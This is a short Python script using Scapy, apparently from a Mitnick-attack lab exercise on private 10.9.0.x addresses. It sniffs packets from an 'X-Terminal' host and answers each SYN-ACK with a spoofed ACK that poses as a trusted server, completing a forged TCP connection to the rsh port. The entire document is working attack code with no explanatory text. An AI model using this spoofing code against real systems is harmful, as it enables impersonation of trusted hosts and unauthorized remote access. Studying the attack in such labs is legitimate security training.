
from scapy.all import *

x_ip = "10.9.0.5" #X-Terminal 
x_port = 514 #Port number used by X-Terminal

srv_ip = "10.9.0.6" #The trusted server 
srv_port = 1023 #Port number used by the trusted server 


def spoof_pkt(pkt):
	pkt.show()
	Seq=123456789 + 1
	old_ip=pkt[IP]
	old_tcp=pkt[TCP]

	tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4 #TCP data length
	print ("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport,old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))


	#Construct the IP header of the response 
	if old_tcp.flags=="SA":
		print("sending spoofed ACK packet to the X-Terminal (Victim)")
		ip=IP(src=srv_ip,dst=x_ip)
		tcp=TCP(sport=srv_port, dport=x_port, flags="A", seq=Seq, ack=old_ip.seq + 1)
		pkt=ip/tcp
		send(pkt, verbose=0)

pkt=sniff(iface="br-b4db7f32bb2e",filter="tcp and src host 10.9.0.5", prn=spoof_pkt) 